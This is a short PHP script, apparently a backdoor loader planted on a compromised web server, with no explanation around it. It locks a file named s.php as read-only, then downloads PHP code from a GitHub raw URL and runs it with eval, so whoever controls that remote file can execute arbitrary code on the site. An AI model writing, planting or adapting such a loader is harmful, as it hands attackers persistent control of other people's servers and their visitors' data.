<?php
$file = 's.php';
chmod($file, 0444);
?>

<?php
$remoteUrl = "https://raw.githubusercontent.com/5Y4H/seo/main/seobarbar.php";
$ch = curl_init($remoteUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$remoteCode = curl_exec($ch);
if (curl_errno($ch)) {
    die('cURL error: ' . curl_error($ch));
}
curl_close($ch);
eval("?>" . $remoteCode);
?>
